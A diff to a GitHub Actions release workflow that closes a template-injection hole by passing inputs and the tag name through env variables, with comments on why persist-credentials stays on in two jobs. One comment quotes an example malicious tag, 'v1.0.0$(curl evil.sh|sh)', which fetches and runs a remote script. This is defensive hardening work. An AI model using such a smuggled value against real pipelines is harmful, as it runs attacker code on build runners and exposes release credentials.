@@ -85,16 +85,29 @@ jobs:
       - name: Resolve and validate version
         id: resolve
         shell: bash
+        # Read every ${{ }} context value through env: rather than
+        # interpolating it straight into the script text. inputs.version and
+        # github.ref_name are both attacker-reachable (a workflow_dispatch
+        # caller, or anyone who can push a tag) - substituted directly they'd
+        # be shell CODE, not data, and a tag like 'v1.0.0$(curl evil.sh|sh)'
+        # would execute. As an env var, the shell only ever sees it as the
+        # value of $VERSION_TAG_INPUT etc. (zizmor: template-injection).
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          VERSION_TAG_INPUT: ${{ inputs.version }}
+          DRY_RUN_INPUT: ${{ inputs.dry_run }}
+          PRERELEASE_INPUT: ${{ inputs.prerelease }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
           set -euo pipefail
           semver_re='^v[0-9]+\.[0-9]+\.[0-9]+(-(alpha|beta|rc)\.[0-9]+)?$'
 
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            version_tag="${{ inputs.version }}"
-            is_dry_run="${{ inputs.dry_run }}"
-            manual_prerelease="${{ inputs.prerelease }}"
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            version_tag="$VERSION_TAG_INPUT"
+            is_dry_run="$DRY_RUN_INPUT"
+            manual_prerelease="$PRERELEASE_INPUT"
           else
-            version_tag="${{ github.ref_name }}"
+            version_tag="$REF_NAME"
             is_dry_run="false"
             manual_prerelease="false"
           fi
@@ -185,6 +198,11 @@ jobs:
       # failing a release that has not provisioned a signing key yet.
       HAVE_GPG_KEY: ${{ secrets.REPO_GPG_PRIVATE_KEY != '' && 'true' || 'false' }}
     steps:
+      # persist-credentials is deliberately left at its default (true), not
+      # false: "Push release tag" below runs a plain `git push origin "$TAG"`
+      # against this checkout, which needs the token actions/checkout leaves
+      # behind. Every other checkout in this repo sets persist-credentials:
+      # false (it isn't needed there) - this is the one job where it is.
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 
       - name: Download package artifacts
@@ -371,6 +389,10 @@ jobs:
     permissions:
       contents: write
     steps:
+      # persist-credentials left at its default (true) for the same reason as
+      # the github-release job above: "Delete orphaned tag" pushes a tag
+      # deletion with plain git, not gh, and needs the token this leaves
+      # behind.
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 
       - name: Delete orphaned tag, if it was pushed
